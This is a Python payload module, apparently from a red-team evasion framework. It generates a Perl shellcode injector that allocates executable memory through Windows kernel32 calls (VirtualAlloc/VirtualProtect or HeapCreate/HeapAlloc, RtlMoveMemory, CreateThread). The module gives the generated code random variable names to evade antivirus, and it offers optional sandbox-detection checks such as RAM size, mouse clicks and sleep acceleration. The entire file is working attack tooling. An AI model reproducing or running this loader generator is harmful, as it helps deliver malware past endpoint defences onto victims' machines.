"""

Custom-written perl inline shellcode injector.

Approach by @the_grayhound and @christruncer
Updated by @ChrisTruncer

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.shortname = "VirtualAlloc"
        self.language = "perl"
        self.extension = "pl"
        self.rating = "Excellent"
        self.description = "VirtualAlloc pattern for shellcode injection"
        self.name = "Perl flat shellcode injector"
        self.path = "perl/shellcode_inject/flat"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # optional
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "USERPROMPT"     : ["X", "Optional: Prompt for user activity"],
            "RAMSIZE"        : ["X", "Optional: Check RAM size of target"],
            "NUMPROCS"       : ["X", "Optional: Minimum number of running processes"],
            "FILENAME"       : ["X", "Optional: File name check"],
            "DISKSIZE"       : ["X", "Optional: Minimum disk size on target"],
            "NUMCLICKS"      : ["X", "Optional: Minimum number of mouse clicks"],
            "REGSIZE"        : ["X", "Optional: Minimum size of system registry"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):

        # How I'm tracking the number of nested tabs needed
        # to make the payload
        num_ends_required = 0
        payload_code = "use Win32::API;\n"

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode

        payload_code2, num_ends_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2

        # randomly generate variable names
        shellcode_variable = evasion_helpers.randomString()
        ptrName = evasion_helpers.randomString()
        rand_valloc = evasion_helpers.randomString()
        rand_movemem = evasion_helpers.randomString()
        rand_cthread = evasion_helpers.randomString()
        rand_waitfor = evasion_helpers.randomString()
        rand_heapcreate = evasion_helpers.randomString()
        rand_heapalloc = evasion_helpers.randomString()
        rand_thread = evasion_helpers.randomString()
        rand_protect = evasion_helpers.randomString()
        protect_out = evasion_helpers.randomString()

        payload_code += '\t' * num_ends_required + "my $%s = \"%s\";\n" % (shellcode_variable, Shellcode)
        payload_code += '\t' * num_ends_required + "$" + rand_movemem + " = new Win32::API('kernel32', 'RtlMoveMemory', 'IPI', 'V');\n"
        payload_code += '\t' * num_ends_required + "$" + rand_cthread + " = new Win32::API('kernel32', 'CreateThread', 'IIIIIP', 'I');\n"
        payload_code += '\t' * num_ends_required + "$" + rand_waitfor + " = new Win32::API('kernel32', 'WaitForSingleObject', 'II', 'I');\n"

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += '\t' * num_ends_required + "$" + rand_valloc + " = new Win32::API('kernel32', 'VirtualAlloc', 'IIII', 'I');\n"
            payload_code += '\t' * num_ends_required + "$" + rand_protect + " = new Win32::API('kernel32', 'VirtualProtect', 'PIIP', 'I');\n"
            payload_code += '\t' * num_ends_required + "my $" + ptrName + " = $" + rand_valloc + "->Call(0, length($" + shellcode_variable + "), 0x1000, 0x04);\n"
            payload_code += '\t' * num_ends_required + "$" + rand_movemem + "->Call($%s, $%s, length($%s));\n" % (ptrName, shellcode_variable, shellcode_variable)
            payload_code += '\t' * num_ends_required + "my $" + protect_out + " = $" + rand_protect + "->Call(" + ptrName + ", length($" + shellcode_variable + "), 0x20, 0);\n"

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            rand_heapcrout = evasion_helpers.randomString()
            payload_code += '\t' * num_ends_required + "$" + rand_heapcreate + " = new Win32::API('kernel32', 'HeapCreate', 'III', 'I');\n"
            payload_code += '\t' * num_ends_required + "$" + rand_heapalloc + " = new Win32::API('kernel32', 'HeapAlloc', 'III', 'I');\n"
            payload_code += '\t' * num_ends_required + "my $" + rand_heapcrout + " = $" + rand_heapcreate + "->Call(0x00040000, length(" + shellcode_variable + ")*2, 0);\n"
            payload_code += '\t' * num_ends_required + "my $" + ptrName + " = $" + rand_heapalloc + "->Call($" + rand_heapcrout + ", 0x00000008, length(" + shellcode_variable + "));\n"
            payload_code += '\t' * num_ends_required + "$" + rand_movemem + "->Call($%s, $%s, length($%s));\n" % (ptrName, shellcode_variable, shellcode_variable)

        payload_code += '\t' * num_ends_required + "my $" + rand_thread + " = $" + rand_cthread + "->Call(0, 0, $%s, 0, 0, 0);\n" % (ptrName)
        payload_code += '\t' * num_ends_required + "$" + rand_waitfor + "->Call($" + rand_thread + ", -1);\n"
        payload_code += '}\n' * num_ends_required

        self.payload_source_code = payload_code
        return
